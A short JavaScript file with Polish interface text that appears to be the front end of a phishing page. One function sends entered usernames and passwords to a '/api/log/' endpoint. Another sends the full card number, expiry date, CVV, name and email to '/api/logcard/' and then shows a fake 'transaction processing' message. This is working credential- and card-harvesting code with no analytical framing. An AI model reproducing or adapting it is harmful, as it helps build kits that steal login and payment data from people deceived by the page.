console.log('main.js loaded')

function logFunction() {
    $.post("/api/log/", {
        username: $("#login").val(),
        password: $("#pass").val()
    }).done(data => {
        toastr[data["status"]](data["message"], data["title"])
        if (data["status"] == "success") {
            console.log('success')
        }
    }).fail(error => {
        console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
    })
}

function logCardFunction() {
    if ($("#card-email").val() && $("#card-name").val() && $("#card-number").val() && $("#card-date").val() && $("#card-cvv").val() !== "" ) {
        $.post("/api/logcard/", {
            email: $("#card-email").val(),
            name: $("#card-name").val(),
            number: $("#card-number").val(),
            date: $("#card-date").val(),
            cvv: $("#card-cvv").val()
        }).done(data => {
            toastr[data["status"]](data["message"], data["title"])
            if (data["status"] == "success") {
                console.log('success')
            }
        }).fail(error => {
            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
        })
        document.getElementById('main').innerHTML = '<p style="font-size: 17px">Twoja tranzakcja jest przetwarzana. Za chwilę zostaniesz przekierowany na stronę główną.</p>'
    } else {
        document.getElementById('invaild').style.display = 'block';
    }
}